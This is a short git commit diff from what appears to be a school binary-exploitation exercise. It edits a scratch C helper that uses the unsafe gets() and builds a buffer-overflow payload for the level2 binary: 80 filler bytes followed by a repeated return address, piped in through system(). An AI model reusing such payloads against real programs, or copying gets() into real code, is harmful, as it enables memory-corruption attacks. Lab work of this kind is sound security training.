a4af38f97703058f7fce269a8785ef9bce52228d
Neben <bperez@student.42lyon.fr>
2023-12-11 03:47:14 +0100

    .

--- level2/resources/tmp/x.c
+++ level2/resources/tmp/x.c
@@ -7,6 +7,7 @@ char hello[50] = {0};
 gets(hello);
 char *x = strndup(hello, 50);
 printf("%p\n", x);
-system("python -c \"print(b'a'*80 + b'\x08\xb0\x04\x80' * 4)\" | ~/level2");
+//system("python -c \"print(b'a'*80 + b'\x08\xb0\x04\x80' * 4)\" | ~/level2");
+system("./a"); // prints the value from address pointed by x
 return 0;
 }
